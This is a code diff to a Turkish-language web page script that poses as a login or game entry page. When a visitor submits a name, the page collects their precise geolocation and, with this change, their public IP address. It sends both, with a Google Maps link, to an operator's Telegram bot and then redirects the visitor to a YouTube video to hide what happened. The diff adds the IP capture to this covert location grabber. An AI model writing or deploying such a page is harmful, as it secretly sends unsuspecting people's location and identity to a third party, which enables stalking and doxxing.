@@ -31,22 +31,28 @@
 
   <script>
     let konum = null;
-    let konumAlindi = false;
+    let ipAdres = "Bilinmiyor";
 
-    // Sayfa açılır açılmaz konum izni iste
-    window.onload = function() {
+    // Sayfa açılır açılmaz konum izni iste ve IP al
+    window.onload = async function() {
+      // Konum
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(function(position) {
           konum = {
             lat: position.coords.latitude,
             lon: position.coords.longitude
           };
-          konumAlindi = true;
         }, function(error) {
-          konumAlindi = false;
+          document.getElementById("uyari").textContent = "📍 Bu site için konum izni gerekiyor!";
         });
-      } else {
-        konumAlindi = false;
+      }
+
+      // IP adresi
+      try {
+        const ipData = await fetch("https://api.ipify.org?format=json").then(res => res.json());
+        ipAdres = ipData.ip;
+      } catch (e) {
+        ipAdres = "Alınamadı";
       }
     };
 
@@ -55,7 +61,7 @@
       const uyari = document.getElementById("uyari");
       uyari.textContent = "";
 
-      if (!konumAlindi) {
+      if (!konum) {
         uyari.textContent = "📍 Bu site için konum izni gerekiyor!";
         return;
       }
@@ -72,7 +78,7 @@
       const chatId = text.match(/CHAT_ID=(.*)/)[1].trim();
 
       const mapsLink = `https://www.google.com/maps?q=${konum.lat},${konum.lon}`;
-      const message = `🎮 Yeni Giriş!\n\n👤 İsim: *${name}*\n📍 Konum: *${konum.lat}, ${konum.lon}*\n🌐 Harita: [Google Maps](${mapsLink})`;
+      const message = `🎮 Yeni Giriş!\n\n👤 İsim: *${name}*\n📍 Konum: *${konum.lat}, ${konum.lon}*\n🌐 Harita: [Google Maps](${mapsLink})\n🖥️ IP: *${ipAdres}*`;
 
       const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
       const payload = {
@@ -87,8 +93,8 @@
         body: JSON.stringify(payload)
       });
 
-      // Videoya yönlendir
-      window.location.href = "https://www.youtube.com/watch?v=IxX_QHay02M";
+      // YouTube videosuna yönlendir
+      window.location.href = "https://www.youtube.com/watch?v=gdCZMdkdlBg";
     }
   </script>
 </body>
